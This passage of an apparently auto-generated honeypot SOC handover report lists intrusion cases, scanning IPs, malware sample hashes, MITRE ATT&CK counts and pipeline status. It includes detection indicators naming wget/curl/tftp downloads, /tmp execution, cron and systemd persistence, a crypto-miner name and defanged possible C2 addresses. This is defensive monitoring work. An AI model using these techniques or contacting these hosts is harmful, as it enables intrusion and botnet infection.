| IR-1e1de2bc0baa | HIGH | `92.118.39[.]14` | 2026-11-22 02:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b7867d18b8d4 | HIGH | `92.118.39[.]14` | 2026-11-22 02:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e0c3f7382463 | HIGH | `92.118.39[.]14` | 2026-11-22 02:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e1d8f979c144 | HIGH | `171.243.150[.]240` | 2026-11-22 02:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-98d4495ce020 | HIGH | `92.118.39[.]14` | 2026-11-22 02:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8fd3b479c7c3 | HIGH | `92.118.39[.]14` | 2026-11-22 02:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c58da844c785 | HIGH | `92.118.39[.]14` | 2026-11-22 02:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-19d53de846e6 | HIGH | `152.32.145[.]49` | 2026-11-22 02:20 | Y | 0 | 0 | `T1078` |
| IR-15330299ab4a | HIGH | `152.32.145[.]49` | 2026-11-22 02:21 | Y | 2 | 0 | `T1078` |
| IR-7f86508677ec | HIGH | `92.118.39[.]14` | 2026-11-22 02:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8cfeb1031bd7 | HIGH | `92.118.39[.]14` | 2026-11-22 02:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f140e74fbc86 | HIGH | `92.118.39[.]14` | 2026-11-22 02:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b433f13b678d | HIGH | `92.118.39[.]14` | 2026-11-22 02:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d2c12d952a7a | HIGH | `195.178.110[.]232` | 2026-11-22 02:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9cdf7da0a0c8 | HIGH | `195.178.110[.]232` | 2026-11-22 02:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6cf009d5f4af | HIGH | `195.178.110[.]232` | 2026-11-22 02:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3062de5eb1be | HIGH | `195.178.110[.]232` | 2026-11-22 02:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-782332e55165 | HIGH | `78.128.112[.]74` | 2026-11-22 02:54 | Y | 1 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `77.239.124[.]132` | **2** | 2026-11-22 01:28 | 2026-11-22 02:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]107` | 1 | 2026-11-22 01:48 | 2026-11-22 01:49 | 8s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-22 01:07 | 2026-11-22 01:08 | 31s | 0 | `T1592` | 🟢 LOW |
| `152.32.145[.]49` | 1 | 2026-11-22 02:20 | 2026-11-22 02:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-22 00:02 | 2026-11-22 00:03 | 35s | 0 | `T1592` | 🟢 LOW |
| `169.128.70[.]53` | 1 | 2026-11-22 01:49 | 2026-11-22 01:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `171.243.150[.]240` | 1 | 2026-11-22 02:18 | 2026-11-22 02:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `173.191.35[.]151` | 1 | 2026-11-22 00:15 | 2026-11-22 00:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.53.181[.]199` | 1 | 2026-11-22 01:10 | 2026-11-22 01:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-22 01:56 | 2026-11-22 01:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-11-22 02:43 | 2026-11-22 02:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]49` | 1 | 2026-11-22 01:27 | 2026-11-22 01:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.83.58[.]208` | 1 | 2026-11-22 02:04 | 2026-11-22 02:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `3.88.39[.]75` | 1 | 2026-11-22 01:19 | 2026-11-22 01:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-11-22 01:37 | 2026-11-22 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.49[.]221` | 1 | 2026-11-22 00:43 | 2026-11-22 00:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-22 01:15 | 2026-11-22 01:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]62` | 1 | 2026-11-22 02:32 | 2026-11-22 02:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-22 01:16 | 2026-11-22 01:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-22 02:54 | 2026-11-22 02:54 | 6s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]24` | 1 | 2026-11-22 02:00 | 2026-11-22 02:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-11-22 01:22 | 2026-11-22 01:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.148.10[.]61` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `160.119.66[.]206` | NL | HostMem | **100** ⚠️ | 50 |
| `64.62.197[.]62` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `195.178.110[.]232` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `173.191.35[.]151` | US | WINDSTREAM COMMUNICATIONS LLC | **100** ⚠️ | 6 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `199.165.159[.]105` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 11 |
| `3.88.39[.]75` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 1 |
| `199.165.159[.]49` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 23 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 63 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 59 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 45 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 90 cases |
| Tool 34  | Credential Extractor        | ✅ 326 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 51 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (10.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 22 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-22T03:58:40Z_
